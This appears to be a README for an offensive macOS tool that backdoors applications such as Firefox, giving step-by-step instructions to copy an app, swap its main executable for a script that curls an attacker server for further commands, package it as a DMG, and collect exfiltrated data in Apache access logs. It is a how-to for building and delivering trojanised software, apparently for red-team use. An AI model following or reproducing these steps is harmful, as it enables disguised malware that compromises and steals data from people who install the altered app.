Cribbed largely from https://github.com/D00MFist/Mystikal DMG module    
dependency included https://github.com/al45tair/dmgbuild

This version is meant to be more cut and dry to backdoor an app   

```
git clone the repo
cd dmgbuild && sudo python3 ./setup.py install && cd ..

Download Firefox     
https://www.mozilla.org/en-US/firefox/download     
Drag it to your Mac Desktop, rename it to "Firefox_Fed"    
Now drag it into /Applications/ 

python3 ./App_phisher.py
````
The script works by copying the entire app from /Applications,    
    backing up the original executable that launches the app,    
    then replacing it with a script to curl out to the attack server to retrieve more commands    

To backdoor an app:    
Step 1: Right click the app (must be in /Applications/) + "Show Package Contents"     
Step 2: Navigate down to Contents/MacOS/     
Step 3: Verify the main executable (in Firefoxs example, its firefox)     
Step 4: Update line 19 with the app to be copied     
Step 5: Update line 21 with the correct main executable name     
Step 6: Update line 24 with the real executable to launch once complete     

Host "fed.sh" on a fresh instance and update the lines to pull either the info you want and where to curl it to
Ensure all data is captured correctly in the apache access logs


 


Testing / Not working yet
Download Chrome https://www.google.com/chrome/    
Drag it to your Mac Desktop, rename it to "Chrome_Fed"    
Now drag it into /Applications/   

